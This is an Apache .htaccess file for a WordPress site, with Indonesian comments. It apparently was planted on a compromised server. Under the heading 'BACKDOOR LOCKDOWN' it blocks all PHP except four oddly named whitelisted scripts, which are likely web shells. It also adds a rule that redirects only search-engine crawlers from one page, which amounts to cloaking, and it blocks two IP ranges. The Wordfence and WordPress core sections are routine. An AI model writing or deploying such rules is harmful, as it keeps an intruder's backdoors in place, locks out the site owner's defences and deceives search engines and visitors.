RewriteOptions inherit

# ===============================
# BACKDOOR LOCKDOWN (BLOCK ALL PHP)
# ===============================

<FilesMatch "\.php$">
    Order Deny,Allow
    Deny from all
</FilesMatch>

# ===== WHITELIST FILES =====
<Files "media.php">
    Allow from all
</Files>

<Files "default.php">
    Allow from all
</Files>

<Files "include.php">
    Allow from all
</Files>

<Files "content-amag.php">
    Allow from all
</Files>


# ===============================
# USER AGENT REDIRECT (punyamu)
# ===============================

<IfModule mod_rewrite.c>
RewriteEngine On

RewriteCond %{REQUEST_URI} ^/ceo-message/?$ [NC]
RewriteCond %{HTTP_USER_AGENT} "(googlebot|bingbot|baiduspider|yandexbot|duckduckbot|slurp|sogou|exabot|facebookexternalhit|facebot|twitterbot)" [NC]
RewriteCond %{THE_REQUEST} /ceo-message [NC]
RewriteRule ^ https://taalumgroup.com/ [R=301,L]
</IfModule>

# ===============================
# MATIKAN EXEC ENGINE DI FOLDER RAW
# ===============================

<Directory "/wp-content/uploads">
    <FilesMatch "\.php$">
        Deny from all
    </FilesMatch>
</Directory>

<Directory "/wp-includes">
    <FilesMatch "\.php$">
        Deny from all
    </FilesMatch>
</Directory>

<Directory "/images">
    <FilesMatch "\.php$">
        Deny from all
    </FilesMatch>
</Directory>


# ===============================
# WORDPRESS CORE (DIBIARKAN)
# ===============================

<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteRule . /index.php [L]
</IfModule>


# ===============================
# LITESPEED
# ===============================

<IfModule Litespeed>
SetEnv noabort 1
</IfModule>


# ===============================
# WORDFENCE
# ===============================

<IfModule LiteSpeed>
php_value auto_prepend_file '/home/gk4juni457tt/public_html/taalumgroup.com/wordfence-waf.php'
</IfModule>

<IfModule lsapi_module>
php_value auto_prepend_file '/home/gk4juni457tt/public_html/taalumgroup.com/wordfence-waf.php'
</IfModule>


<Files ".user.ini">
<IfModule mod_authz_core.c>
    Require all denied
</IfModule>
<IfModule !mod_authz_core.c>
    Order deny,allow
    Deny from all
</IfModule>
</Files>


# ===============================
# IP BLOCK
# ===============================

Deny from 159.223.0.0/16
Deny from 208.76.0.0/16
